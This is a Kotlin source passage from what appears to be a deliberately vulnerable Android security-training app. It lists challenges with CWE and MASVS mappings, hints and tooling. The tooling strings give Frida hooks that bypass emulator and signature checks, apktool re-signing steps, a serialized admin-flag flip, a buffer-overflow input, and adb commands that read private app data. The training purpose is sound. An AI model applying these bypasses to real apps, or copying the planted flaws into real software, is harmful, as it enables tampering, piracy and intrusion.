                "You know P1 (the greeting) and both ciphertexts. The key never leaves the device, and you don't need it.",
                "P2 = C1 xor P1 xor C2. Decode it as ASCII and submit it.",
            ),
            tooling = "python3 -c 'c1=bytes.fromhex(\"<C1>\");c2=bytes.fromhex(\"<C2>\");p1=b\"GUEST_SESSION_HEADER_2026_pad_0000000\";print(bytes(a^b^c for a,b,c in zip(c1,p1,c2)).decode())'",
        ),
        Challenge(
            id = "dexload", title = "Unverified Dynamic Code Loading",
            description = "DexClassLoader loads plugin classes from writable storage without signature checks.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-494", masvs = "CODE-4", maswe = "MASWE-0049", mastg = "", cvss = "8.4 (High)",
            hints = listOf(
                "PluginLoader writes dynamic_plugin.manifest to a shared cache directory and runs the entry_class it names.",
                "The engine still references an internal vault-dump plugin. Search the decompiled PluginLoader for it.",
                "Set the target class name to com.evilcorp.plugin.DumpVaultPlugin and execute.",
            ),
            tooling = "// Frida: trace DexClassLoader / PathClassLoader loads\n" +
                "Java.perform(() => {\n" +
                "  const D = Java.use('dalvik.system.DexClassLoader');\n" +
                "  D.\$init.implementation = function (p, o, l, parent) {\n" +
                "    console.log('DexClassLoader path=' + p); return this.\$init(p, o, l, parent);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "serialization", title = "Unsafe Java Deserialization",
            description = "Untrusted Base64 Java ObjectInputStream restores a privileged SessionTokenParcel.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-502", masvs = "CODE-4", maswe = "MASWE-0050", mastg = "MASTG-TEST-0337", cvss = "8.1 (High)",
            hints = listOf(
                "Java serialized streams start with magic bytes 0xACED0005 (Base64 'rO0AB...').",
                "SessionTokenParcel has a boolean field isSuperAdmin; its value is the last byte of the stream.",
                "Decode the blob, flip the trailing 0x00 to 0x01, re-encode it as Base64 and deserialize.",
            ),
            tooling = "echo '<base64>' | base64 -d | xxd\n" +
                "# Change the trailing boolean byte 00 -> 01 and re-encode with base64",
        ),
        Challenge(
            id = "nativebridge", title = "JNI Stack Buffer Overflow",
            description = "Unbounded copy into a 16-byte JNI C stack buffer overwrites an adjacent privilege flag.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-120", masvs = "CODE-4", maswe = "MASWE-0050", mastg = "MASTG-TEST-0043", cvss = "8.4 (High)",
            hints = listOf(
                "struct jni_auth_frame places char username[16] immediately before uint8_t privileged.",
                "Any input longer than 16 ASCII characters spills into the 17th byte (offset 16).",
                "Enter 17+ characters (e.g. AAAAAAAAAAAAAAAAA) and verify the badge.",
            ),
            tooling = "# This screen models the JNI frame in Kotlin. The C version ships as a static-analysis target:\n" +
                "unzip -o app-debug.apk 'lib/*' && nm -D lib/arm64-v8a/libevilcorp_native.so | grep evilcorp\n" +
                "\n" +
                "// Frida 17 (open the lab first so the library is loaded): call the export directly\n" +
                "const lib = Process.getModuleByName('libevilcorp_native.so');\n" +
                "const verify = new NativeFunction(lib.getExportByName('evilcorp_verify_serial'), 'int', ['pointer', 'int']);\n" +
                "console.log(verify(Memory.allocUtf8String('A'.repeat(20)), 20));",
        ),
        Challenge(
            id = "emulator", title = "Emulator Detection Bypass",
            description = "The provisioning key is blocked whenever Build.* and qemu indicators look like an emulator.",
            difficulty = Difficulty.Medium, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-1", maswe = "MASWE-0053", mastg = "MASTG-TEST-0351", cvss = "4.3 (Medium)",
            hints = listOf(
                "EmulatorDetector.isEmulator() makes the decision on its own; the indicator list always contains a synthetic qemu probe.",
                "Look for a getprop call in EmulatorDetector: a QA override was never removed.",
                "Hook EmulatorDetector.isEmulator() to return false, or run adb shell setprop debug.evilcorp.real_device 1.",
            ),
            tooling = "adb shell setprop debug.evilcorp.real_device 1\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.EmulatorDetector').isEmulator.implementation = () => false;\n" +
                "});",
        ),
        Challenge(
            id = "repackaging", title = "APK Signature & Installer Check",
            description = "Client-side signing-certificate and installer checks gate premium content.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-345", masvs = "RESILIENCE-2", maswe = "MASWE-0056", mastg = "MASTG-TEST-0050", cvss = "5.3 (Medium)",
            hints = listOf(
                "The screen shows the real SHA-256 of the certificate that signed your build and the real installer package.",
                "Both are compared against constants inside ApkSignatureVerifier.isOfficialBuild(). You cannot forge the release key.",
                "Hook ApkSignatureVerifier.isOfficialBuild() to return true, or patch it in smali, rebuild and re-sign.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.ApkSignatureVerifier').isOfficialBuild.implementation = () => true;\n" +
                "});\n" +
                "\n" +
                "# Or patch the check and re-sign (uninstall the original first)\n" +
                "apktool d app-debug.apk -o ec      # make isOfficialBuild return true in smali\n" +
                "apktool b ec -o patched.apk && zipalign -f 4 patched.apk aligned.apk\n" +
                "apksigner sign --ks my-test.jks aligned.apk",
        ),
        Challenge(
            id = "tracking", title = "Persistent Device Fingerprinting",
            description = "Analytics SDK harvests ANDROID_ID and hardware serials into a beacon after opt-out.",
            difficulty = Difficulty.Easy, area = Area.Privacy,
            cwe = "CWE-359", masvs = "PRIVACY-2", maswe = "MASWE-0068", mastg = "MASTG-TEST-0318", cvss = "5.3 (Medium)",
            hints = listOf(
                "Press 'Decline Tracking & Trigger SDK Init'. The consent receipt claims nothing was collected.",
                "The SDK spools a beacon in the app's private files directory.",
                "adb shell run-as com.evilcorp.android cat files/telemetry_beacon.json",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/telemetry_beacon.json",
        ),
        Challenge(
            id = "notifications", title = "Public Lockscreen Notification Leak",
            description = "A wire-approval notification posted with VISIBILITY_PUBLIC carries the approval token in its extras.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0037", mastg = "MASTG-TEST-0315", cvss = "4.8 (Medium)",
            hints = listOf(
                "Post the notification, then look at what the system stores about it, not only at what the lock screen shows.",
                "Notification extras are readable by every NotificationListenerService and by dumpsys.",
                "adb shell dumpsys notification --noredact | grep -i approval_token",
            ),
            tooling = "adb shell dumpsys notification --noredact | grep -i -B2 -A2 approval_token\n" +
                "\n" +
                "// Frida: watch what the app hands to the notification manager\n" +
                "Java.perform(() => {\n" +
                "  const NM = Java.use('android.app.NotificationManager');\n" +
                "  NM.notify.overload('int', 'android.app.Notification').implementation = function (id, n) {\n" +
                "    console.log(n.extras.value.toString()); return this.notify(id, n);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "strandhogg", title = "Task Affinity & Activity Hijack",
            description = "Non-empty taskAffinity with allowTaskReparenting lets a foreign activity hijack the stack.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-1021", masvs = "PLATFORM-3", maswe = "MASWE-0039", mastg = "", cvss = "6.8 (Medium)",
            hints = listOf(
                "Keep taskAffinity set to com.evilcorp.android and allowTaskReparenting enabled.",
                "Press 'Launch App & Inspect ActivityManager Backstack' to observe the reparented activity.",
                "Set taskAffinity to empty and allowTaskReparenting to false to test the remediation.",
            ),
            tooling = "adb shell dumpsys activity activities | grep -E 'TaskRecord|Hist #'",
        ),
    )

    fun byId(id: String): Challenge? = all.firstOrNull { it.id == id }

    fun controlInfo(masvsId: String): MasvsControl? =
        masvsFamilies.asSequence().flatMap { it.controls }.firstOrNull { it.id == masvsId }
}
